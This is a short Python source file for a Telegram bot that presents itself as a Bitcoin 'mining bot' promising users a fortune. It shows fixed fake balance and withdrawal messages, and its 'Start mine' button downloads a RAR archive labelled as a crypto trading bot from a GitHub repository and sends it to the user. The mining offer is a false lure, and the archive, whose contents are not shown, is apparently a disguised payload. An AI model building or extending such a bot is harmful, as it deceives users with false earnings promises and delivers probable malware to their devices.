import telebot
import constant
from telebot import types
import time
import urllib.request as urllib2

bot = telebot.TeleBot(constant.API_TOKEN)

@bot.message_handler(commands=['start', 'help'])
def send_welcome(massage):
    bot.send_message(massage.from_user.id, "Hello! I am mining bot, with which you earn a fortune!", reply_markup=murkup_menu)

murkup_menu = types.ReplyKeyboardMarkup(True, False)
murkup_menu.row("❓Balance")
murkup_menu.row("💵Withdrawal")
murkup_menu.row("⛏Start mine")

@bot.message_handler(content_types=['text'])
def handle_text(message):
    if message.text == "❓Balance":
        bot.reply_to(message, "Your balance is 0 BTC", reply_markup=murkup_menu)
    elif message.text == "💵Withdrawal":
        bot.reply_to(message, "The minimum withdrawal amount is 0.0005 BTC", reply_markup=murkup_menu)
    elif message.text == "⛏Start mine":
        url = 'https://github.com/tradesoftfree/softbot/raw/master/Crypto-Trading-%20Bot.rar'
        urllib2.urlretrieve(url, 'Crypto-Trading- Bot.rar')
        document = open('Crypto-Trading- Bot.rar', 'rb')
        bot.send_chat_action(message.from_user.id, 'upload_document')
        bot.send_document(message.from_user.id, document)
        document.close()

bot.polling()